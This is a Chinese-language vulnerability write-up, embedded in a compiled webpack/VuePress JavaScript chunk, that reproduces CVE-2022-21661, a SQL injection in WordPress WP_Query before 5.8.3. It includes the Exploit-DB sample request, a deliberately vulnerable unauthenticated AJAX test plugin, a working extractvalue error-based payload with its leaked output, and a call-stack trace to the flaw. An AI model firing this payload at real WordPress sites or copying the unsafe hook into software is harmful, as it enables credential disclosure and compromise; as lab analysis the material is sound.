(window.webpackJsonp=window.webpackJsonp||[]).push([[106],{557:function(t,e,s){"use strict";s.r(e);var n=s(65),r=Object(n.a)({},(function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞"}},[t._v("#")]),t._v(" 漏洞")]),t._v(" "),s("p",[t._v("wpscan确定版本号，找到该版本严重的sql注入漏洞：\nhttps://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317")]),t._v(" "),s("p",[t._v("https://www.exploit-db.com/exploits/50663")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('# Exploit Title: WordPress Core 5.8.2 - \'WP_Query\' SQL Injection\n# Date: 11/01/2022\n# Exploit Author: Aryan Chehreghani\n# Vendor Homepage: https://wordpress.org\n# Software Link: https://wordpress.org/download/releases\n# Version: < 5.8.3\n# Tested on: Windows 10\n# CVE : CVE-2022-21661\n\n# [ VULNERABILITY DETAILS ] : \n\n#This vulnerability allows remote attackers to disclose sensitive information on affected installations of WordPress Core,\n#Authentication is not required to exploit this vulnerability, The specific flaw exists within the WP_Query class,\n#The issue results from the lack of proper validation of a user-supplied string before using it to construct SQL queries,\n#An attacker can leverage this vulnerability to disclose stored credentials, leading to further compromise.\n\n# [ References ] : \n\nhttps://wordpress.org/news/category/releases\nhttps://www.zerodayinitiative.com/advisories/ZDI-22-020\nhttps://hackerone.com/reports/1378209\n\n# [ Sample Request ] :\n\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: localhost\nUpgrade-Insecure_Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: cross-site\nSec-Fetch-User: ?1\nCache-Control: max-age=0\nConnection: close \nContent-Type: application/x-www-form-urlencoded\n\naction=<action_name>&nonce=a85a0c3bfa&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["<inject>"]}}}\n')])])]),s("h2",{attrs:{id:"修复"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#修复"}},[t._v("#")]),t._v(" 修复")]),t._v(" "),s("p",[t._v("wordpress fix:\nhttps://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/")]),t._v(" "),s("p",[t._v("https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214")]),t._v(" "),s("h2",{attrs:{id:"重现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#重现"}},[t._v("#")]),t._v(" 重现")]),t._v(" "),s("p",[t._v("环境搭建去我网站上自己找,不再重复,")]),t._v(" "),s("p",[t._v("注意，目前官方下载的5.8.2版本中已经包含修复，重现需要注释相应代码；\n开启debug：define( 'WP_DEBUG', true );")]),t._v(" "),s("p",[t._v("添加测试代码:")]),t._v(" "),s("p",[t._v("方法一:\n默认主题直接添加")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("wp-content\\themes\\twentytwentyone\\functions.php:\nfunction wp_query_test(){\n\techo 'hello CVE2022-1661';\n    $query = stripslashes($_POST['query_vars']);\n    $jsonDecodedQuery = json_decode($query,true);\n    $wpTest = new WP_Query($jsonDecodedQuery);\n    wp_die();\n}\nadd_action('wp_ajax_nopriv_test','wp_query_test',1);\n")])])]),s("p",[t._v("方法二:\n创建插件并安装\nwp_query_test.php")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("<?php\n/**\n * Plugin Name: TEST CVE2022-1661\n * Plugin URI: https://www.exploit-db.com/exploits/50663\n * Description: TEST CVE2022-1661\n * Version: 1.0\n * Author: LIU YUE\n * Author URI: http://lyhistory.com\n */\nfunction wp_query_test(){\n\techo 'hello CVE2022-1661';\n    $query = stripslashes($_POST['query_vars']);\n    $jsonDecodedQuery = json_decode($query,true);\n    $wpTest = new WP_Query($jsonDecodedQuery);\n    wp_die();\n}\n\nadd_action('wp_ajax_nopriv_test','wp_query_test');\n\n?>\n")])])]),s("p",[t._v("压缩成zip,后台安装,activate")]),t._v(" "),s("p",[t._v("firefox hackbar：")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("post:http://testphp.local/wp-admin/admin-ajax.php\npayload: action=test&query_vars={\"tax_query\":{\"0\":{\"field\":\"term_taxonomy_id\",\"terms\":[\"111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#\"]}}}\n\nRESPONSE:\nWordPress database error: [XPATH syntax error: '^root@localhost^']\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#) ) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'attachment' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending'))) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10\n")])])]),s("p",[t._v("callstack:")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("wp-admin/admin-ajax.php:\nif ( ! has_action( \"wp_ajax_nopriv_{$action}\" ) ) {\n    wp_die( '0', 400 );\n}\n$wp_filter array(411)\n....\nwp_ajax_nopriv_test: WP_Hook\n...\ndo_action( \"wp_ajax_nopriv_{$action}\" );\n\n=>\nwp-content\\themes\\twentytwentyone\\functions.php:\nfunction wp_query_test(){\n    $c=stripslashes($_POST['data']);\n    $d = json_decode($c, true);\n    $wp=new WP_Query($d);\n    wp_die();\n}\n\nwp-includes\\class-wp-query.php:\npublic function __construct( $query = '' ) {\n\t\tif ( ! empty( $query ) ) {\n\t\t\t$this->query( $query );\n\t\t}\n\t}\n\npublic function query( $query ) {\n\t\t$this->init();\n\t\t$this->query      = wp_parse_args( $query );\n\t\t$this->query_vars = $this->query;\n\t\treturn $this->get_posts();\n\t}\n\npublic function get_posts() {\n\t\tglobal $wpdb;\n\n\t\t$this->parse_query();    \n        ...\n        // Taxonomies.\n\t\tif ( ! $this->is_singular ) {\n\t\t\t$this->parse_tax_query( $q );   => $this->tax_query = new WP_Tax_Query( $tax_query );\n\n\t\t\t>>>1: $clauses = $this->tax_query->get_sql( $wpdb->posts, 'ID' );\n\n\t\t\t$join  .= $clauses['join'];\n\t\t\t$where .= $clauses['where'];\n\t\t}\n        ...\n        $old_request   = \"SELECT $found_rows $distinct $fields FROM {$wpdb->posts} $join WHERE 1=1 $where $groupby $orderby $limits\";   \n        //\"SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( \n  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\n) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' O\"\n\t\t$this->request = $old_request;\n        ...\n        $this->request = \"SELECT $found_rows $distinct {$wpdb->posts}.ID FROM {$wpdb->posts} $join WHERE 1=1 $where $groupby $orderby $limits\";\n        //\"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( \n  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\n) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' \"\n        $this->request = apply_filters( 'posts_request_ids', $this->request, $this );\n        \n        >>>2: $ids = $wpdb->get_col( $this->request );\n        //WordPress database error XPATH syntax error: '^root@localhost^' for query SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( \n  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\n) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (\"\n\n        return $this->posts; array(0)\n\n>>>1:$this->tax_query->get_sql\n=>\nwp-includes\\class-wp-tax-query.php\npublic function get_sql( $primary_table, $primary_id_column ) {\n\t\t$this->primary_table     = $primary_table;\n\t\t$this->primary_id_column = $primary_id_column;\n\n\t\treturn $this->get_sql_clauses();\n\t}\n=>\n$query\narray(1)\n0: array(5)\ntaxonomy: \"\"\nterms: array(1)\n0: \"111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#\"\nfield: \"term_taxonomy_id\"\noperator: \"IN\"\ninclude_children: true\n\nprotected function get_sql_clauses() {\n\t\t/*\n\t\t * $queries are passed by reference to get_sql_for_query() for recursion.\n\t\t * To keep $this->queries unaltered, pass a copy.\n\t\t */\n\t\t$queries = $this->queries;\n\t\t$sql     = $this->get_sql_for_query( $queries );\n\n\t\tif ( ! empty( $sql['where'] ) ) {\n\t\t\t$sql['where'] = ' AND ' . $sql['where'];\n\t\t}\n\n\t\treturn $sql;\n            array(2)\n            join: \" LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)\"\n            where: \" AND ( \n            wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\n            )\"\n\t}\n=>\nprotected function get_sql_for_query( &$query, $depth = 0 ) {\n    ...\n    $clause_sql = $this->get_sql_for_clause( $clause, $query );\n    ...\n    return $sql;\n        array(2)\n        join: \" LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)\"\n        where: \"( \n        wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\n        )\"\n\n}   \n=>\npublic function get_sql_for_clause( &$clause, $parent_query ) {\n    global $wpdb;\n    ...\n    $this->clean_query( $clause );\n    ...\n    $terms = implode( ',', $terms );    //\"111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#\"\n    $where = \"$alias.term_taxonomy_id $operator ($terms)\"; //\"wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\"\n\n\treturn $sql;\n        array(2)\n        where: array(1)\n        0: \"wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)\"\n        join: array(1)\n        0: \" LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)\"\n} \n=>\n存在bug,sql可以逃逸\nprivate function clean_query( &$query ) {\n    ...\n    // if ( 'slug' === $query['field'] || 'name' === $query['field'] ) {\n        $query['terms'] = array_unique( (array) $query['terms'] );\n    // } else {\n        // $query['terms'] = wp_parse_id_list( $query['terms'] );\n    // }  \n    ...\n    $this->transform_query( $query, 'term_taxonomy_id' );\n}   \nterm_taxonomy_id\npublic function transform_query( &$query, $resulting_field ) {\n    if ( empty( $query['terms'] ) ) {\n        return;\n    }\n\n    if ( $query['field'] == $resulting_field ) {\n        return;\n    }  \n    ...\n}\n\n>>>2:\nwp-includes\\wp-db.php\npublic function get_col( $query = null, $x = 0 ) {\n    ...\n    $this->query( $query );\n    ...\n}\npublic function query( $query ) {\n    ...\n    $this->print_error();\n    ...\n}\n")])])]),s("p",[t._v("总结：")]),t._v(" "),s("ol",[s("li",[t._v("虽然是核心的bug,触发则是由 theme或者plugin调用的时候传入可控变量引起的")]),t._v(" "),s("li",[t._v("如果没有开启debug模式，则可以使用盲注")])]),t._v(" "),s("p",[t._v("用你善于发现的眼睛去发现惊喜吧")]),t._v(" "),s("p",[t._v("refer:\nhttps://stackdiary.com/sql-injection-in-wordpress-core-cve-2022-21661/")])])}),[],!1,null,null,null);e.default=r.exports}}]);